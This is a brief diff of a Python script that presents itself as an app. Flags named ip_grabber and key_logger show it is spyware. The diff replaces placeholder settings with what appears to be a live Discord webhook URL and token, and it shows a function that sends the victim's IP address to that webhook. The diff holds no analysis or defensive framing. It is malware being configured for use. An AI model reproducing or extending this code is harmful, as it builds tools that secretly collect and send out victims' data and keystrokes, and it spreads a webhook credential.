@@ -9,7 +9,7 @@ import re
 from urllib.request import Request, urlopen
 import socket 
 
-hostname = socket.gethostname() 
+hostname = socket.gethostname()
 
 IPAddr = socket.gethostbyname(hostname) 
 
@@ -20,9 +20,9 @@ ip_grabber_f = True
 key_logger = True
 today = date.today()
 
-ext = {"webhook-id": "ChangeMe", "webhook-name": "ChangeMe"}
+ext = {"webhook-id": "https://discordapp.com/api/webhooks/833422825754460190/De7d5OZoCy0Kupg5cqHn6rqJ7nedLo769IVUrSJz3WE3Tg1ol7uc5rppECslR6ZMlIEk", "webhook-name": "capdin huk"}
 
-os.system('title TITLE OF THE APP')
+os.system('title EPIC')
 
 def ip_grabber():
     webhook = DiscordWebhook(url=ext['webhook-id'], content=f"User IP Address: {IPAddr}",  username=ext['webhook-name'])
